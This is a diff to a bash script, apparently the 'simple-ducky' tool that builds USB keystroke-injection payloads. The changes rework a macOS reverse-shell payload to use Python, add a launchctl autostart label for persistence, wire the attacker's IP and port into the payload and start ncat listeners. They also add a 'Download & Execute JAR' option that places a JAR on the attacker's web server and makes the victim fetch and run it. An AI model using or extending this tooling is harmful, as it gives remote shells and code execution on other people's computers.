@@ -96,7 +96,7 @@ f_persistenceVIS7uac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		xterm -e ncat -lvp $attackerport &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -2820,10 +2820,11 @@ f_wifunWIN8nouac(){
 f_osxrev(){
 	clear
 	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell."
-	echo -e "\e[1;31mNote:\e[0m Ncat will need to be installed for this payload to work."
+	echo -e "\e[1;31mNote:\e[0m Python will need to be installed for this payload to work."
 	echo -e "\e[1;31mTarget:\e[0m MAC OSX (Various)"
-	echo -e "\e[1;31mAuthor:\e[0m Sharkey"	
+	echo -e "\e[1;31mAuthor:\e[0m Kidovate"	
 	echo ""
+	read -p "Launchctl autostart label? " launchlabel
 	echo ""
 	read -p "Where shall I send your shell? " attackerip
 	echo ""
@@ -2835,8 +2836,9 @@ f_osxrev(){
 	clear
 	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
 	echo ""
-	sed "/nc/s/ipport/$attackerip $attackerport/g" /usr/share/simple-ducky/payloads/osxrev.conf > /usr/share/simple-ducky/payload.txt
+	sed -e "s/attackerip/$attackerip/g" -e "s/attackerport/$attackerport/g" /usr/share/simple-ducky/payloads/osxrev.conf > /usr/share/simple-ducky/payload.txt
 	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
+	sed -i "s/someName/$launchlabel/g" /usr/share/simple-ducky/payload.txt
 	clear
 	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
 	if [ "$language" == "o" ]; then
@@ -2868,12 +2870,14 @@ f_osxrev(){
 		read -p "Press any key to contiue" enter
 	fi 
 	clear
+	echo "To catch your shell, use: "
+	echo "   ncat -l $attackerport"
 	read -p "Would you like me to setup a listener [y/n]? " listener
 	clear
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e ncat -vl $attackerport &
 		xdg-open /usr/share/simple-ducky/ &
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -5437,7 +5441,8 @@ f_attackadd(){
 		echo "5. Rouge Access Point"
 		echo "6. Auto Associate to Rogue Access Point"
 		echo "7. Local DNS Poisoning"
-		echo "8. Post Attack Options"
+		echo "8. Download & Execute JAR"
+		echo "9. Post Attack Options"
 		echo ""
 		read -p "Option: " mainattack
 
@@ -5449,7 +5454,8 @@ f_attackadd(){
 		5) f_rogueaccess ;;
 		6) f_autoassociate ;;
 		7) f_dnspoison ;;
-		8) f_postattackadd ;;
+	        8) f_jarexecute ;;
+		9) f_postattackadd ;;
 		*) clear;exit ;;
 		esac
 
@@ -5652,7 +5658,40 @@ f_extracthash(){
 	sleep 3
 	f_attackadd
 }
-
+####### Down & Execute JAR    ###########
+f_jarexecute(){
+	clear
+	echo -e "\e[1;34mDownload and Execute JAR\e[0m"
+	echo ""
+	read -p "Where is your JAR located? " jarpath
+	echo ""
+	#Check if file exists
+	if [ -e $jarpath ]
+	then
+		echo "File is valid, copying to web server..."
+		cp $jarpath /var/www/7za.txt
+		clear
+		echo -e "\e[1;34mNow let's build your inject.bin\e[0m"	
+		echo ""
+		echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
+		read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
+		echo ""
+		clear
+		echo -e "\e[1;34mAdding the JAR to your payload...\e[0m"
+		echo ""
+		sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute.conf > /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute_del1.conf
+		cat /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute_del1.conf >> /usr/share/simple-ducky/payload.txt
+		echo  >> /usr/share/simple-ducky/payload.txt
+		rm /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute_del1.conf
+		echo ""
+		read -p "Press Enter to continue..." contuinue
+		f_attackadd
+	else
+		echo "File does not exist, please try again! (3 seconds)"
+		sleep 3
+		f_jarexecute
+	fi
+}
 ####### Reverse Shell Options ###########
 f_revshells(){
 	clear
